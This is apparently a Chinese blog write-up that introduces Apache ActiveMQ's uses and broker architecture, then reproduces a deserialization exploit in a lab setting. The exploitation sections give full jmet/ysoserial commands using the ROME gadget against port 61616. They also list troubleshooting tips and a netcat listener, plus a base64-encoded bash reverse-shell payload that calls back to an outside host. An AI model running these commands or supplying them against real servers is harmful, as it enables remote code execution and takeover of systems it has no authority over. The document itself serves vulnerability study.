# 2.ActiveMQ用途

ActiveMQ主要用于在分布式系统中传递消息，并且提供了完整的JMS规范实现。使用ActiveMQ可以使得应用程序更加灵活、可扩展、面向服务、可重用和响应性更好。具体来说，ActiveMQ可以被用作以下场景：

1、企业应用集成（EAI）

2、科学计算

3、在线游戏

4、股票和金融

5、电话中心

6、电子商务等

# 3.ActiveMQ的架构和组件

ActiveMQ架构基于Broker模型，Broker是一个中间件服务，它负责接收来自消息生产者的消息并将其存储在消息队列或主题中，同时也负责将消息发送给消息消费者。ActiveMQ中包含以下组件：

Broker：消息代理服务，主要负责消息的路由和转发。

Transport Connector：支持多种通信协议的连接器，如TCP、AMQP、STOMP等。

Message：消息实体，包含消息头、消息体和消息属性等信息。

Message Producer：消息生产者，用于向消息队列或主题发送消息。

Message Consumer：消息消费者，用于从消息队列或主题中获取消息。

Destination：目的地，指消息发送的地点，可以是队列或主题。

JMS Provider：JMS提供者，提供了Java应用程序与ActiveMQ之间的通信接口和实现。

# 6.漏洞利用

使用jmet进行漏洞利用（原理：使用集成的ysoserial生成payload并发送）。

<mark class="encrypted">f31K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5i4c8@1K9r3W2S2M7$3E0S2K9i4y4W2M7W2)9J5c8X3A6E0k6i4c8Q4x3V1k6J5k6h3I4W2j5i4y4W2M7H3`.`.</mark>

下载jmet到本地,同级目录创建external目录，否则可能会报文件夹不存在的错误。

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

利用jmet构造消息队列发送到目标服务器61616端口（这里为在目标服务器`/tmp/`目录创建一个success文件）

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME ip 61616
```

![图片描述](upload/attach/202309/878276_N57XKNWY3KD6UGB.png)

访问web站点查看创建的消息队列是否成功，【真实环境中需要先拿到 ActiveMQ 的登录账号密码】，此处靶场账号密码为 admin/admin

![图片描述](upload/attach/202309/878276_W7YMXDJWZBHSC4X.png)

### 这里复现的时候有几个小坑需要注意：

1、java版本必须是1.8，也就是jdk-8，高于这个版本必失败

2、退出docker容器，在当前目录下创建external文件见（`mkdir external`）

3、执行java命令安装jar的时候使用的ip需要是本机内网的ip，不能是公网ip否则将报错初始化失败：ERROR d.c.j.JMET [main] Init failed:（后面发现出现这种初始化失败的原因是因为防火墙没有把端口61616放行，放行后就不会报这个错了）

# 7.反弹shell

## 7.1漏洞利用条件

需要管理员/用户登录后台点击创建的消息队列事件

## 7.2设置本地监听

另起一个命令执行页面：`nc -lvvp 12340`

### 反弹shell遇到的几个坑

1、ip需要是公网ip，且防火墙记得给端口放行

2、装好后要从message id点进去才能监听上

3、反弹shell命令必须要进行base64编码，否则将反弹失败

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAMjU0LjAuMS8xMjM0MCAwPiYx}|{base64,-d}|{bash,-i}" -Yp ROME 公网ip 61616
```
